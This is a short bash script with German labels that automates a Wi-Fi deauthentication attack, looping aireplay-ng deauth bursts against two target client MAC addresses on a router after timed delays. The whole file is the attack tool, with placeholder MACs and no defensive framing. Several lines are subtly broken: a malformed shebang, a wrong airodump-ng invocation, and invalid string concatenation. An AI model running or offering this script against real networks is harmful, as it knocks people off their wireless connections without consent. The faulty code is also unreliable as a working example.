#!bin/bash
wifiKanal=1
zielMAC1='99:99:99:99:99:99'
zielMAC2='FF:FF:FF:FF:FF:FF'
attempts=66
timerInSeconds=666
pauseInSeconds=6
signalCuts=66
useDevice='wlo1'
airodump-ng start $useDevice $wifiKanal
accessMAC='00:00:00:00:00:00'
useDevice='$useDevice' + 'mon'
# ACHTUNG: Skript vorher testen!!!
while [ $attempts -gt 0 ]
do
  echo "Wifi-Geraet: $useDevice"
  echo "Wifi-Kanal: $wifiKanal"
  echo "Router-MAC: $accessMAC"
  echo "Angriffsziele: $zielMAC1 und $zielMAC2"
  echo "Angriffszahl: $attempts Anlaeufe"
  echo "Angriffslaenge: $signalCuts Frames"
  echo "Zwischenpausen: $pauseInSeconds Sekunden"
  echo "Startverzögerug: $timerInSeconds Sekunden"
  sleep $timerInSeconds
  attempts=$((attempts-1))
  aireplay-ng -0 $signalCuts -a $accessMAC -c $zielMAC1 $useDevice
  aireplay-ng -0 $signalCuts -a $accessMAC -c $zielMAC2 $useDevice
  sleep $pauseInSeconds;
done
